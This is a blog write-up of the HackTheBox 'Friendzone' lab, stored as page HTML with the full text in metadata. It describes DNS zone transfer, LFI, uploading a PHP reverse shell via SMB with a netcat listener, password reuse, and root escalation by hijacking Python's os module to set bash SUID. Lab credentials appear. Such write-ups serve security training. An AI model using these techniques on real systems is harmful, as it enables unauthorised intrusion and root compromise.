<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Friendzone | PwndSide</title><meta name=keywords content="privesc,web,linux"><meta name=description content="Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Friendzone"><meta property="og:description" content="Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root."><meta property="og:type" content="article"><meta property="og:url" content="https://pwndside.github.io/posts/friendzone-htb/"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-11T19:13:39+02:00"><meta property="article:modified_time" content="2023-09-11T19:13:39+02:00"><meta property="og:site_name" content="PwndSide"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Friendzone"><meta name=twitter:description content="Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Friendzone","item":"https://pwndside.github.io/posts/friendzone-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Friendzone","name":"Friendzone","description":"Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root.","keywords":["privesc","web","linux"],"articleBody":"Room Information Room name: Friendzone Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Friendzone Tools Used nmap Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo= | 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl 53/tcp open domain syn-ack ttl 63 ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 404 Not Found | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/organizationalUnitName=CODERED/localityName=AMMAN/emailAddress=haha@friendzone.red | Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/organizationalUnitName=CODERED/localityName=AMMAN/emailAddress=haha@friendzone.red | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2018-10-05T21:02:30 | Not valid after: 2018-11-04T21:02:30 | MD5: c144:1868:5e8b:468d:fc7d:888b:1123:781c | SHA-1: 88d2:e8ee:1c2c:dbd3:ea55:2e5e:cdd4:e94c:4c8b:9233 | -----BEGIN CERTIFICATE----- | MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD | VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV | BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv | bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4 | MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD | VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ | MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq | hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA | A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8 | lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH | 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH | gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh | 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q | ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW | BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz | V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj | TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ | LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME | K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF | Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG | X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ | fv9s+GxKNvsBqDBX |_-----END CERTIFICATE----- 445/tcp open syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: , NetBIOS MAC: (unknown) | Names: | FRIENDZONE\u003c00\u003e Flags: | FRIENDZONE\u003c03\u003e Flags: | FRIENDZONE\u003c20\u003e Flags: | \\x01\\x02__MSBROWSE__\\x02\u003c01\u003e Flags: | WORKGROUP\u003c00\u003e Flags: | WORKGROUP\u003c1d\u003e Flags: | WORKGROUP\u003c1e\u003e Flags: | Statistics: | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 |_ 00:00:00:00:00:00:00:00:00:00:00:00:00:00 |_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2023-09-06T15:35:12 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 60332/tcp): CLEAN (Couldn't connect) | Check 2 (port 29635/tcp): CLEAN (Couldn't connect) | Check 3 (port 37865/udp): CLEAN (Failed to receive data) | Check 4 (port 49559/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2023-09-06T18:35:12+03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) The scan shows 7 ports up and running, 80 and 443 are running web servers, 139 and 445 are smb ports, 22 for ssh, 21 for ftp and 25 is running a ISC service which is a kind of DNS.\nI’ll take careful notice of the domain in the TLS certificate, commonName=friendzone.red\nEnumeration As always I am gonna start with the websites.\nFirst let’s start with the http server.\nTe homepage leaks a email with a URL friendzoneportal.red maybe there is virtualhosting in the website.\ngobuster dir -u http://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t 100 -o fuzz | tee fuzz.save /index.html (Status: 200) [Size: 324] /robots.txt (Status: 200) [Size: 13] /server-status (Status: 403) [Size: 300] /wordpress (Status: 301) [Size: 316] [--\u003e http://10.10.10.123/wordpress/] After a quick fuzz two directories are shown\n/robots.txt is troll.\n/wordpress is empty.\nSo let’s move to the ssl site.\nIn the homepage we found normal gif but if we access to the source code there is a comment leaking a directory /js/js on development.\nThe directory /js/js is a page which maybe something is being tested.\nThere are also some hidden comments at the source code.\n\u003cp\u003eTesting some functions !\u003c/p\u003e\u003cp\u003eI'am trying not to break things !\u003c/p\u003e SkUyRVFwSlF2VzE2OTQzMzc4MjIybkJLbUE5RVdN I don’t know what are they referring to, but you have to keep in mind that it could just be a rabbit hole.\nLet’s do a quick fuzz\ngobuster dir -u https://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t 100 -o fuzz | tee fuzz.save /admin (Status: 301) [Size: 318] [--\u003e https://friendzone.red/admin/] /index.html (Status: 200) [Size: 238] /js (Status: 301) [Size: 315] [--\u003e https://friendzone.red/js/] /server-status (Status: 403) [Size: 303] Again, only two directories are displayed\n/admin is a empty directory as /wordpress in the http site.\n/js lists only one directory named /js which is the one we have already visited.\nIf we return to the nmap scan there, the TCP port 53 is for DNS which means that maybe this is associated with Zone Transfers, where the server give all the information it has for a domain. Before doing any virtual hosting scans I checked Zone Transfers for enumerating DNS.\nAs we have two domains let’s see what outputs dig command.\ndig @10.10.10.123 friendzone.red axfr ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e @10.10.10.123 friendzone.red axfr ; (1 server found) ;; global options: +cmd friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red.\t604800\tIN\tAAAA\t::1 friendzone.red.\t604800\tIN\tNS\tlocalhost. friendzone.red.\t604800\tIN\tA\t127.0.0.1 administrator1.friendzone.red. 604800 IN A\t127.0.0.1 hr.friendzone.red.\t604800\tIN\tA\t127.0.0.1 uploads.friendzone.red.\t604800\tIN\tA\t127.0.0.1 friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 110 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) ;; WHEN: Sun Sep 10 12:07:34 CEST 2023 ;; XFR size: 8 records (messages 1, bytes 261) dig @10.10.10.123 friendzoneportal.red axfr ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e @10.10.10.123 friendzoneportal.red axfr ; (1 server found) ;; global options: +cmd friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzoneportal.red.\t604800\tIN\tAAAA\t::1 friendzoneportal.red.\t604800\tIN\tNS\tlocalhost. friendzoneportal.red.\t604800\tIN\tA\t127.0.0.1 admin.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 files.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 imports.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 vpn.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 104 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) ;; WHEN: Sun Sep 10 12:08:07 CEST 2023 ;; XFR size: 9 records (messages 1, bytes 281) Cool we have a bunch of possible subdomains, let’s put them on /etc/hosts\nFirst I tried to access to each subdomain with the http port but seem to go back to the same site so I started to do it with ssl site instead.\nDomain Comments administrator1.friendzone.red Seems a admin page uploads.friendzone.red Fake uploads site hr.friendzone.red Not Found friendzoneportal.red Only a GIF of Michael Jackson admin.friendzoneportal.red When I try to put any creds shows “Admin page is not developed yet !!! check for another one” files.friendzoneportal.red Not Found imports.friendzoneportal.red Not Found vpn.friendzoneportal.red Not Found administrator1.friendzone.red is the only one which seems working but need a valid credentials. I tried some common credentials but failed.\nLet’s move now to other ports.\nI started with the ftp service. I tried to log in anonymously but the login failed\nSo I decided to try to access to smb instead, using smbmap I can access anonymously and see what permissions I have on the shares.\nInteresting the Files shares comment show his directory so we can assume that all the directories are located at /etc without doing any enumeration.\nThanks to smbmap we also know that general is only readable and Development is readable and writeable.\nDevelopment seems empty.\ngeneral has only one file with credentials.\ncreds for the admin THING: admin:WORKWORKHhallelujah@# Maybe there are credentials for the admin site.\nExploiting Once logged in in the admin page, the site tells yo to visit to the dashboard.\nIn order to show the image we need to put the two default parameters.\nimage_id=a.jpg\u0026pagename=timestamp\nInteresting pagename points to timestamp and if the input is not being sanitized maybe we can change the input to other file.\nI tried to point to the dashboard.php page but the site is not loading.\nAfter that I realized that the code is putting .php at the end of the input.\nimage_id=a.jpg\u0026pagename=dashboard\nThe site is loading infinite times so we can assume that we have LFI with php files.\nNow we have LFI and if we remember the samba shares are pointing to folders on the /etc directory so we are able to upload a shell and make it run with the pagename parameter.\nThe only share which is writable is the Development folder so I tried to upload a php reverse shell. As always I am gonna using the pentestmonkey one\nsmbmap -H 10.10.10.123 --upload './shell.php' 'Development\\shell.php' Now let’s set a nc listener and run the php reverse shell with the next parameters image_id=a.jpg\u0026pagename=../../../../../../etc/Development/shell\nnc -lv 4444 Gaining an Initial Foothold Great we are www-data now.\nEscalating Privilege If we check the /var/www directory where are located all the sites we can see a suspicious mysql file.\nfor development process this is the mysql creds for user friend db_user=friend db_pass=Agpyu12!0.213$ db_name=FZ Seems credentials for access to a mysql database, but let’s see if there is a password reuse.\nI tried to access to the user friend with the command su friend\nAwesome we are logged as normal user.\nNow it’s time to privEsc.\nAs always I checked for unusual processes or open ports but I don’t found anything and then I have searched for SUID files to exploit but there was nothing exploitable.\nOnce done the initial check I start the scan of scheduled processes with moniProc.sh which I have used in a lot of writeups.\n\u003e /usr/sbin/CRON -f \u003e /bin/sh -c /opt/server_admin/reporter.py \u003e /usr/bin/python /opt/server_admin/reporter.py A cronjob is executing a python script, let’s check his content.\n#!/usr/bin/python import os to_address = \"admin1@friendzone.com\" from_address = \"admin2@friendzone.com\" print \"[+] Trying to send email to %s\"%to_address #command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \"PAPAP\"''' #os.system(command) # I need to edit the script later # Sam ~ python developer The scripts doesn’t seems exploitable but is using the os library, if this library is vulnerable to Library Hijacking we are able to execute whatever we want.\nThe attack explanation is simple, the searched python module will be located in one of the defined paths, but if Python finds a module with the same name in a folder with higher priority, it will import that module instead of the “legit” one.\nWe can know the Python Path with the following command.\npython -c 'import sys; print(sys.path)' ['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages'] The first path that python will check will be the script directory, if nothing is located at the script directory python will check all the remaining paths.\nAs we can’t write anything on the script folder, we need to check if any folder containing os.py module is writable in order to perform the attack.\nAs we know the first folder python will check is the /usr/lib/python2.7, let’s check if we can modify the module.\nWe have permissions to edit the file so we can put the following line of code which is going to be executed always when we import the library.\nsystem('chmod 4755 /bin/bash') As the cronjob is executed as root, we are able to execute commands as the above which helps us to privEsc changing the bash permissions to that of a SUID file.\nNow only rests to wait.\nUntitled\nIf we execute the following command the current bash session is gonna turn to a root session.\nbash -p ","wordCount":"1918","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-09-11T19:13:39+02:00","dateModified":"2023-09-11T19:13:39+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/friendzone-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class=post-title>Friendzone</h1><div class=post-description>Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root.</div><div class=post-meta><span title='2023-09-11 19:13:39 +0200 CEST'>September 11, 2023</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;1918 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/friendzone-htb.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Friendzone</li><li>Difficulty level: Easy</li><li>Room link: <a href=https://app.hackthebox.com/machines/Friendzone>https://app.hackthebox.com/machines/Friendzone</a></li></ul><p><img loading=lazy src=/HTB/friend-icon.png alt=Untitled></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>nmap</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT    STATE SERVICE     REASON         VERSION
</span></span><span class=line><span class=cl>21/tcp  open  ftp         syn-ack ttl <span class=m>63</span> vsftpd 3.0.3
</span></span><span class=line><span class=cl>22/tcp  open  ssh         syn-ack ttl <span class=m>63</span> OpenSSH 7.6p1 Ubuntu <span class=m>4</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl
</span></span><span class=line><span class=cl>53/tcp  open  domain      syn-ack ttl <span class=m>63</span> ISC BIND 9.11.3-1ubuntu1.2 <span class=o>(</span>Ubuntu Linux<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> dns-nsid:
</span></span><span class=line><span class=cl><span class=p>|</span>_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
</span></span><span class=line><span class=cl>80/tcp  open  http        syn-ack ttl <span class=m>63</span> Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: HEAD GET POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Friend Zone Escape software
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn syn-ack ttl <span class=m>63</span> Samba smbd 3.X - 4.X <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>443/tcp open  ssl/http    syn-ack ttl <span class=m>63</span> Apache httpd 2.4.29
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: <span class=m>404</span> Not Found
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: HEAD GET POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn:
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>friendzone.red/organizationName<span class=o>=</span>CODERED/stateOrProvinceName<span class=o>=</span>CODERED/countryName<span class=o>=</span>JO/organizationalUnitName<span class=o>=</span>CODERED/localityName<span class=o>=</span>AMMAN/emailAddress<span class=o>=</span>haha@friendzone.red
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>friendzone.red/organizationName<span class=o>=</span>CODERED/stateOrProvinceName<span class=o>=</span>CODERED/countryName<span class=o>=</span>JO/organizationalUnitName<span class=o>=</span>CODERED/localityName<span class=o>=</span>AMMAN/emailAddress<span class=o>=</span>haha@friendzone.red
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key type: rsa
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key bits: <span class=m>2048</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2018-10-05T21:02:30
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid after:  2018-11-04T21:02:30
